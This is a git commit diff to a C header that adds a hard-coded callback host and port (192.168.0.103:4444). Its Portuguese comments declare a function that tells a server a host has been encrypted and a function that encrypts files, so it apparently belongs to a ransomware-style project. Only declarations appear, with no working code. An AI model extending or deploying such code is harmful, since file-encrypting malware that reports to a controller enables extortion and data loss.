892fd6161eac29a8ea3e7655ff9761dddb202f41
KvN0X00 <65466003+Kanui-C@users.noreply.github.com>
2021-04-14 10:51:03 -0300

    Update funcs.h

--- libs/funcs.h
+++ libs/funcs.h
@@ -1,7 +1,11 @@
 #ifndef USAGE_H_INCLUDED
 #define USAGE_H_INCLUDED
 
+#define myhost "192.168.0.103"
+#define myport 4444
+
 struct dirent *getdir;
+
 //Funçao que avisa o servidor que algum host foi criptografado
 void connectserver();
 //Funçao que faz a criptografia de arquivos
